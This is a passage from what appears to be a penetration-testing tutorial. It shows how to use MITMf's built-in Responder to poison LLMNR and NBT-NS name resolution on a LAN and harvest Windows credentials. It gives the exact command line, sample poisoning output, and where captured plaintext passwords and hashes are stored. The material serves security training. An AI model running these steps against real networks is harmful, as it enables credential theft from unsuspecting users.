    # Service Poisoning with MITMF


    MITMf is a great tool, but thing we didn''t cover in the previous chapter is it
    actually includes Responder! Responder integration allows for LLMNR, NBTNS and
    MDNS poisoning with WPAD support directly in MitMf. So, let''s see how to perform
    basic service poisoning and credential harvesting with MitMf.


    At a terminal prompt:


    Enter, "mitmf -i eth0 --responder --wredir --nbtns --basic"

    And that is, MitMf starts with responder support:


    ```

    $ Responder online

    * Running on http://127.0.0.1:9999/ (Press Ctrl+C to quit)

    DNS:0.4 online

    * SMB server online


    2018-06-28 15:49:49 192.168.1.93 [NBT-NS] Poisoned answer for name WIN-420RBM3SR
    VF (service: Domain Controller)

    2018-06-28 15:49:04 192.168.1.93 [LLMNR] Poisoned request for name server

    2018-06-28 15:49:04 192.168.1.93 [LLMNR] Poisoned request for name server

    2018-06-28 15:49:04 192.168.1.93 [HTTP] - - GET ''/''

    ```


    ![](img/37a3b7ef116f9ef991f9e33dd8b348c7_232_0.png)


    On the Windows 7 system, if you try to surf to a non-existent UNC path or open
    an browser (if auto-detect proxy is still set) you should get a login prompt:


    If the target enters credentials, you should get them in plain text. You will
    also get a copy of the user''s password hash. The data will be in the "/usr/share/mitmf/logs"
    directory.


    If we look in the ''mitmf.log'' file we should see something like this:'
